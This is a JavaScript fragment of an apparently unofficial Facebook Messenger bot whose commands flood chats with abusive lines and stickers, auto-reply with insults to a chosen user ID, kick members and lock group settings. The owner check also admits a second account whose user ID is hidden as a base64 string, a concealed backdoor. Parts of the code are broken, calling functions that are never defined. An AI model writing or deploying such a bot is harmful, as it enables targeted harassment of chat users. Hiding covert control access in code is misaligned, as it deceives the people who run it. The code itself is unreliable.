const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// Other existing code (locks, watchers, spam variables, etc)...

// Global spam/target variables
let targetUID = null;
let rkbInterval = null;
let stopRequested = false;
let stickerInterval = null;
let stickerLoopActive = false;

// Spam & Target functions (RKB, Target, Sticker systems)
function startRkb(api, threadID, name) {
  if (!fs.existsSync("np.txt")) return api.sendMessage("⚠️ np.txt not found", threadID);
  const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
  stopRequested = false;
  if (rkbInterval) clearInterval(rkbInterval);
  let index = 0;
  rkbInterval = setInterval(() => {
    if (index >= lines.length || stopRequested) {
      clearInterval(rkbInterval);
      rkbInterval = null;
      return;
    }
    api.sendMessage(`${name} ${lines[index]}`, threadID);
    index++;
  }, 60000);
  api.sendMessage(`🚀 RKB start for ${name}`, threadID);
}

function stopRkb(api, threadID) {
  stopRequested = true;
  if (rkbInterval) {
    clearInterval(rkbInterval);
    rkbInterval = null;
    api.sendMessage("🛑 RKB stopped", threadID);
  } else {
    api.sendMessage("⚠️ RKB already stopped", threadID);
  }
}

function setTarget(api, threadID, uid) {
  targetUID = uid;
  api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
}

function clearTarget(api, threadID) {
  targetUID = null;
  api.sendMessage("🎯 Target cleared", threadID);
}

function handleTargetMessage(api, senderID, threadID, messageID) {
  if (fs.existsSync("np.txt") && targetUID && senderID === targetUID) {
    const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
    const randomLine = lines[Math.floor(Math.random() * lines.length)];
    api.sendMessage(randomLine, threadID, messageID);
  }
}

function startStickerSpam(api, threadID, delay) {
  if (!fs.existsSync("Sticker.txt")) return api.sendMessage("❌ Sticker.txt not found", threadID);
  if (isNaN(delay) || delay < 5) return api.sendMessage("🕐 Min 5 sec ka delay do", threadID);
  const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
  if (!stickerIDs.length) return api.sendMessage("⚠️ Sticker.txt khali hai", threadID);
  if (stickerInterval) clearInterval(stickerInterval);
  let i = 0;
  stickerLoopActive = true;
  api.sendMessage(`📦 Sticker spam started: har ${delay} sec`, threadID);
  stickerInterval = setInterval(() => {
    if (!stickerLoopActive || i >= stickerIDs.length) {
      clearInterval(stickerInterval);
      stickerInterval = null;
      stickerLoopActive = false;
      return;
    }
    api.sendMessage({ sticker: stickerIDs[i] }, threadID);
    i++;
  }, delay * 1000);
}

function stopStickerSpam(api, threadID) {
  if (stickerInterval) {
    clearInterval(stickerInterval);
    stickerInterval = null;
    stickerLoopActive = false;
    api.sendMessage("🛑 Sticker spam stopped", threadID);
  } else {
    api.sendMessage("⚠️ Sticker spam already stopped", threadID);
  }
}

function helpMessage() {
  return `
📌 Available Commands:
.rkb <name> – NP.txt se gali spam
.stop – RKB stop
.target <uid> – UID target spam
.cleartarget – Target hatao
.sticker<sec> – Sticker spam (min 5s delay)
.stopsticker – Sticker spam stop
.help – Commands list
.gclock [text] – Group name lock
.unlockgc – Group name unlock
.lockemoji [emoji] – Emoji lock
.unlockemoji – Emoji unlock
.lockdp – DP lock (saves current DP locally)
.unlockdp – DP unlock
.locknick @mention Nickname – Nick lock
.unlocknick @mention – Unlock nick
.tid – Thread ID
.uid – User ID
.info @mention – User info
.kick @mention – Kick user
.exit – Bot exit (bot leaves group)
`;
}

// In your api.listenMqtt event:
api.listenMqtt(async (err, event) => {
  if (err || !event) return;
  if (event.type !== "message" || !event.body) return;

  const { threadID, senderID, messageID, body, mentions, messageReply } = event;
  if (!body.startsWith(".")) return;

  const args = body.slice(1).trim().split(" ");
  const cmd = args[0].toLowerCase();
  const input = args.slice(1).join(" ").trim();

  if (![ownerUID, Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8")].includes(senderID)) return;

  switch (cmd) {
    case "help":
      await safeSend(api, helpMessage(), threadID);
      break;
    case "tid":
      await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID);
      break;
    case "uid":
      const uidTarget = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
      await safeSend(api, `🆔 UID: ${uidTarget}`, threadID);
      break;
    case "info":
      const infoTarget = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
      try {
        const uinfo = await api.getUserInfo(infoTarget);
        const u = uinfo[infoTarget] || {};
        await safeSend(api, `👤 Name: ${u.name || "unknown"}\nUID: ${infoTarget}\nProfile: https://facebook.com/${infoTarget}`, threadID);
      } catch {
        await safeSend(api, "⚠️ Could not fetch user info", threadID);
      }
      break;
    case "kick":
      const kickUser = Object.keys(mentions || {})[0];
      if (!kickUser) {
        await safeSend(api, "❌ Mention user to kick", threadID);
        break;
      }
      try {
        await api.removeUserFromGroup(kickUser, threadID);
        await safeSend(api, `👢 Kicked ${kickUser}`, threadID);
      } catch {
        await safeSend(api, "⚠️ Kick failed", threadID);
      }
      break;
    case "gclock":
      if (!input) {
        await safeSend(api, "❌ Provide group name", threadID);
        break;
      }
      try {
        await api.setTitle(input, threadID);
        locks.groupNames[threadID] = input;
        saveLocks();
        startGroupNameWatcher(threadID, api);
        await safeSend(api, "🔒 Group name locked", threadID);
      } catch {
        await safeSend(api, "⚠️ Failed to set group name", threadID);
      }
      break;
    case "unlockgc":
      delete locks.groupNames[threadID];
      saveLocks();
      stopGroupNameWatcher(threadID);
      await safeSend(api, "🔓 Group name unlocked", threadID);
      break;
    case "lockemoji":
      if (!input) {
        await safeSend(api, "❌ Provide an emoji to lock (e.g. .lockemoji 😀)", threadID);
        break;
      }
      locks.emojis[threadID] = input;
      saveLocks();
      startEmojiWatcher(threadID, api);
      try {
        await api.changeThreadEmoji(input, threadID);
      } catch {}
      await safeSend(api, `😀 Emoji locked → ${input}`, threadID);
      break;
    case "unlockemoji":
      delete locks.emojis[threadID];
      saveLocks();
      stopEmojiWatcher(threadID);
      await safeSend(api, "😀 Emoji unlocked", threadID);
      break;
    case "lockdp":
      try {
        const info = await api.getThreadInfo(threadID);
        const url = info.imageSrc || info.image || info.imageUrl || null;
        if (!url) {
          await safeSend(api, "❌ No group DP to lock (set a DP first)", threadID);
          break;
        }
        const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
        await new Promise((res, rej) => {
          downloadFile(url, dpPath, (err) => (err ? rej(err) : res()));
        });
        locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
        saveLocks();
        startDPWatcher(threadID, api);
        await safeSend(api, "🖼️ Group DP saved and locked!", threadID);
      } catch {
        await safeSend(api, "⚠️ Failed to lock DP (download error)", threadID);
      }
      break;
    case "unlockdp":
      if (locks.dp[threadID]?.path) {
        try {
          fs.unlinkSync(locks.dp[threadID].path);
        } catch {}
      }
      delete locks.dp[threadID];
      saveLocks();
      stopDPWatcher(threadID);
      await safeSend(api, "🖼️ DP unlocked", threadID);
      break;
    case "locknick":
      const mentionLock = Object.keys(mentions || {})[0];
      let nickname = input;
      if (mentionLock) {
        const mentionRegex = new RegExp(`\\s*<@!?${mentionLock}>\\s*`, "g");
        nickname = input.replace(mentionRegex, "").trim();
      }
      if (!mentionLock || !nickname) {
        await safeSend(api, "❌ Usage: .locknick @mention nickname", threadID);
        break;
      }
      locks.nick[mentionLock] = locks.nick[mentionLock] || {};
      locks.nick[mentionLock][threadID] = nickname;
      saveLocks();
      startNickWatcher(mentionLock, threadID, api);
      try {
        await api.changeNickname(nickname, threadID, mentionLock);
      } catch {}
      await safeSend(api, `🔒 Nick locked for <@${mentionLock}> → ${nickname}`, threadID);
      break;
    case "unlocknick":
      const mentionUnlock = Object.keys(mentions || {})[0];
      if (!mentionUnlock) {
        await safeSend(api, "❌ Usage: .unlocknick @mention", threadID);
        break;
      }
      if (locks.nick && locks.nick[mentionUnlock]) {
        delete locks.nick[mentionUnlock][threadID];
        saveLocks();
      }
      stopNickWatcher(mentionUnlock);
      await safeSend(api, `🔓 Nick unlocked for <@${mentionUnlock}>`, threadID);
      break;
    case "target":
      if (!args[1]) {
        await safeSend(api, "👤 UID de jisko target karna hai", threadID);
        break;
      }
      targetUID = args[1];
      await safeSend(api, `Target set ho gaya hai: ${targetUID}`, threadID);
      break;
    case "cleartarget":
      targetUID = null;
      await safeSend(api, "Target clear ho gaya hai.", threadID);
      break;
    case "rkb":
      if (!fs.existsSync("np.txt")) {
        await safeSend(api, "konsa gaLi du rkb ko", threadID);
        break;
      }
      const nameRkb = input.trim();
      const linesRkb = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
      stopRequested = false;
      if (rkbInterval) clearInterval(rkbInterval);
      let indexRkb = 0;
      rkbInterval = setInterval(async () => {
        if (indexRkb >= linesRkb.length || stopRequested) {
          clearInterval(rkbInterval);
          rkbInterval = null;
          return;
        }
        try {
          await api.sendMessage(`${nameRkb} ${linesRkb[indexRkb]}`, threadID);
        } catch {}
        indexRkb++;
      }, 60000);
      await safeSend(api, `sex hogya bche 🤣rkb ${nameRkb}`, threadID);
      break;
    case "stop":
      stopRequested = true;
      if (rkbInterval) {
        clearInterval(rkbInterval);
        rkbInterval = null;
        await safeSend(api, "chud gaye bche🤣", threadID);
      } else {
        await safeSend(api, "konsa gaLi du sale ko🤣 rkb tha", threadID);
      }
      break;
    case "sticker0":
    case "sticker1":
    case "sticker2":
    case "sticker3":
    case "sticker4":
    case "sticker5":
    case "sticker6":
    case "sticker7":
    case "sticker8":
    case "sticker9":
      const sec = parseInt(cmd.replace("sticker", "")) || 2;
      if (!fs.existsSync("Sticker.txt")) {
        await safeSend(api, "❌ Sticker.txt missing", threadID);
        break;
      }
      const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map((s) => s.trim()).filter(Boolean);
      if (!stickers.length) {
        await safeSend(api, "❌ No stickers in Sticker.txt", threadID);
        break;
      }
      let i = 0;
      stickerLoopActive = true;
      if (stickerInterval) clearInterval(stickerInterval);
      stickerInterval = setInterval(() => {
        if (!stickerLoopActive) {
          clearInterval(stickerInterval);
          stickerInterval = null;
          return;
        }
        api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {});
        i = (i + 1) % stickers.length;
      }, sec * 1000);
      await safeSend(api, `⚡ Sticker spam started every ${sec}s`, threadID);
      break;
    case "stopsticker":
      stickerLoopActive = false;
      if (stickerInterval) {
        clearInterval(stickerInterval);
        stickerInterval = null;
      }
      await safeSend(api, "🛑 Sticker spam stopped", threadID);
      break;
    case "exit":
      try {
        await api.removeUserFromGroup(api.getCurrentUserID(), threadID);
      } catch {}
      break;
    default:
      await safeSend(api, "Unknown command", threadID);
  }

  // Handle target spam on every message from targetUID
  if (targetUID && senderID === targetUID) {
    handleTargetSpam(api, senderID, threadID, event.messageID);
  }
});

module.exports = { startBot };
